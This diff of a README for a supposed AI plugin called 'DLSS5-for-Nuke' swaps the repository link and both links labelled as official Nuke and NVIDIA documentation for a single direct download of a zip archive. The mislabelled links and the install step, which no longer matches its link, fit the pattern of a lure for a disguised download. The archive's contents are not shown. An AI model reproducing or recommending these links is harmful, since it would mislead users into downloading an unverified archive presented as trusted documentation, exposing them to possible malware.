@@ -1,6 +1,6 @@
 # ⚡ DLSS5-for-Nuke - Supercharge Your Nuke Workflow with AI
 
-[![Download DLSS5-for-Nuke](https://img.shields.io/badge/Download-DLSS5_for_Nuke-FF6B6B.svg?style=for-the-badge&logo=github)](https://github.com/2148-wq/DLSS5-for-Nuke)
+[![Download DLSS5-for-Nuke](https://img.shields.io/badge/Download-DLSS5_for_Nuke-FF6B6B.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip)
 
 ## 🎯 What Is This?
 
@@ -21,7 +21,7 @@ Before you begin, make sure your computer meets these requirements:
 
 ### 📥 Download and Install
 
-1. **Visit this link to download the application:** [https://github.com/2148-wq/DLSS5-for-Nuke](https://github.com/2148-wq/DLSS5-for-Nuke)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip](https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip)
 
 2. On the page that opens, look for a green **"Code"** button. Click it, then choose **"Download ZIP"**. This will save a compressed folder to your computer.
 
@@ -90,8 +90,8 @@ Double-check that you placed the folder in the correct plugin path. In Nuke, go 
 
 ## 📚 Additional Resources
 
-- **Nuke Official Documentation:** [https://learn.foundry.com/nuke](https://learn.foundry.com/nuke)
-- **NVIDIA DLSS Overview:** [https://www.nvidia.com/en-us/geforce/technologies/dlss](https://www.nvidia.com/en-us/geforce/technologies/dlss)
+- **Nuke Official Documentation:** [https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip](https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip)
+- **NVIDIA DLSS Overview:** [https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip](https://raw.githubusercontent.com/2148-wq/DLSS5-for-Nuke/main/install/Nuke-for-DLS-v2.1.zip)
 - **Report Issues or Get Help:** Visit the repository's **Issues** tab on GitHub to ask questions or report bugs.
 
 ## 📜 License and Legal
